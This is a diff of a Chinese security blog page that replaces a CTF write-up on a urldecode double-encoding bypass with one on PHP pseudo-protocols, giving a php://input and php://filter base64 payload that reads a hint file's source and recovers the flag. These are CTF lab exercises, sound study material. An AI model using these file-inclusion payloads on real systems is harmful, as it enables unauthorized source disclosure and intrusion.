@@ -7,7 +7,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <title>
-    urldecode二次编码绕过 |
+    php伪协议 |
     
     summerN&#39;s blog</title>
   
@@ -32,7 +32,7 @@
   <section class="outer">
   
 
-<article id="post-urldecode二次编码绕过" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+<article id="post-php伪协议" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
   
   <div class="article-inner">
     
@@ -40,7 +40,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      urldecode二次编码绕过
+      php伪协议
     </h1>
   
   
@@ -53,8 +53,8 @@
 
     
       <div class="article-meta">
-        <a href="/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/" class="article-date">
-  <time datetime="2019-12-16T02:37:33.963Z" itemprop="datePublished">2019-12-16</time>
+        <a href="/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+  <time datetime="2020-01-12T13:30:55.096Z" itemprop="datePublished">2020-01-12</time>
 </a>
         
       </div>
@@ -77,18 +77,34 @@
       
 
       
-        <h2 id="代码审计日志三urldecode二次绕过"><a href="#代码审计日志三urldecode二次绕过" class="headerlink" title="代码审计日志三urldecode二次绕过"></a>代码审计日志三urldecode二次绕过</h2><a id="more"></a>
+        <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>看一道题</p>
+<p>上图</p>
+<p><img src="https://i.loli.net/2020/01/12/xvLJ782TrQch6MC.png" alt="QQ截图20200112210840.png"></p>
+<p>可知涉及到php伪协议的问题</p>
+<p>1.在file_get_contents 这里</p>
+<p>我们可以使用php://这个协议php://input可以得到原始的post数据</p>
+<p>2.在include（）这里我们可以看到后面有个提示hint.php</p>
+<p>但是我们把file=hint.php时仍然没有任何代码</p>
+<p>我们可以使用：</p>
+<p>php://filter/convert.base64-encode/resource=取源代码并进行base64编码输出</p>
+<p>若不使用base64编码，我们读取的内容会直接当做php代码执行就看不到源代码内容了。</p>
+<p>上payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?Yeedo&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br><span class="line"></span><br><span class="line">post:Yeedo is a big hacker</span><br></pre></td></tr></table></figure>
 
-<p>题目：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>经过审计：<br>由</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br></pre></td></tr></table></figure>
-<p>可知，我们需要将hackerDJ进行urldecode编码后get上传<br>我们上传后得到：<br>not allowed!<br>再看url<br>发现我们get传入的url编码值被浏览器自动解码<br>因此我们需要再一次进行编码<br>上传后得到flag</p>
+<p><img src="https://i.loli.net/2020/01/12/4SXqOdg3UrDKB7y.png" alt="QQ截图20200112212501.png"></p>
+<p>解码base64</p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//decode(423e1e68bdc71183573da0cd33a1609)='ypcwelcome';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>在之前的payload基础上添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;ypcwelcome</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1a19cbc0200dc984ae400d331a7d1a3d&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/" data-id="ck48fez3o000fhsu3dbdx1xpt"
+      <a data-url="http://yoursite.com/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ck5b24h570000n8lu6a9x2yp8"
          class="article-share-link">Share</a>
       
     </footer>
@@ -99,19 +115,10 @@
     
   <nav class="article-nav">
     
-      <a href="/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/" class="article-nav-link">
-        <strong class="article-nav-caption">Newer posts</strong>
-        <div class="article-nav-title">
-          
-            web狗之xml实体攻击
-          
-        </div>
-      </a>
     
-    
-      <a href="/2019/12/16/sql%E8%AF%AD%E5%8F%A5%E4%B9%8Bwhere%E5%AD%97%E5%8F%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-nav-link">
+      <a href="/2019/12/29/%E7%AC%AC%E5%9B%9B%E5%AD%A3%E7%AD%94%E9%A2%98%E8%B5%9B%20pwn/" class="article-nav-link">
         <strong class="article-nav-caption">Olde posts</strong>
-        <div class="article-nav-title">sql语句之where字句学习笔记</div>
+        <div class="article-nav-title">第四季答题赛 pwn</div>
       </a>
     
   </nav>
